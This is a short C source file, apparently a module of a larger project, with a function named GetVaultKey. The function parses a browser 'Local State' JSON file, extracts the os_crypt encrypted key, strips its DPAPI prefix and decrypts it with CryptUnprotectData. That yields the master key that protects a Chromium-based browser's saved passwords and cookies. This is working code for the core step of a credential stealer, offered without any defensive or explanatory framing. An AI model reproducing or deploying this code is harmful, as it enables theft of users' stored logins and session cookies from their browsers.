#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wincrypt.h>

#include "../include/cjson/cJSON.h"
#include "../include/vaultkey.h"


unsigned char *GetVaultKey(const char* LocalFilePath) {
    FILE *file = fopen(LocalFilePath, "r");
    if (!file)
    {
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    long FileSize = ftell(file);
    rewind(file);

    char *JsonData = (char *)malloc(FileSize + 1);
    if (!JsonData)
    {
        fclose(file);
        return NULL;
    }

    fread(JsonData, 1, FileSize, file);
    fclose(file);
    JsonData[FileSize] = '\0';

    cJSON *buffer = cJSON_Parse(JsonData);
    if (!buffer)
    {
        free(JsonData);
        return NULL;
    }

    cJSON *FirstKey = cJSON_GetObjectItem(buffer, "os_crypt");
    cJSON *SecondKey = cJSON_GetObjectItem(FirstKey, "encrypted_key");

    const char *Base64String = SecondKey->valuestring;

    DWORD CryptedKeySize;
    CryptStringToBinaryA(Base64String, 0, CRYPT_STRING_BASE64, NULL, &CryptedKeySize, NULL, NULL);
    unsigned char *CryptedKey = (unsigned char*)malloc(CryptedKeySize);
    CryptStringToBinaryA(Base64String, 0, CRYPT_STRING_BASE64, CryptedKey, &CryptedKeySize, NULL, NULL);

    CryptedKeySize = CryptedKeySize - 5;
    memmove(CryptedKey, CryptedKey + 5, CryptedKeySize);

    DATA_BLOB CryptedVaultKey = {CryptedKeySize, CryptedKey};
    DATA_BLOB VaultKey;
    CryptUnprotectData(&CryptedVaultKey, NULL, NULL, NULL, NULL, 0, &VaultKey);

    free(JsonData);
    cJSON_Delete(buffer);
    free(CryptedKey);

    return VaultKey.pbData;
}
